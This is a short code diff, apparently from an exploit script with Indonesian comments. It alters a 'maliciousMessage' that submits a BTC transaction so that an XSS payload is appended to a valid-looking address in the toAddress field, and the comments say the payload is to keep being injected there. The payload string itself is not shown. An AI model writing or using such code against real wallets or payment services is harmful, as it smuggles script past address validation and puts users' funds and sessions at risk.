@@ -20,12 +20,14 @@
             // const valid_format_address = "177c1e81f771578941e15b20ce19178f9a";
             const valid_format_address = "177c1e81f771578941e15b20ce19178f9a";
 
+             const final_address_payload = valid_format_address + xss_payload;
+
             const maliciousMessage = {
                 type: 'submitTransaction',
                 transaction: {
                     // Gunakan alamat yang formatnya valid
                     // toAddress: transactionData.toAddress,
-                    toAddress: xss_payload,
+                    toAddress: final_address_payload,
                     // Tetap suntikkan payload di sini
                     currency: "BTC",
                     amount: 1
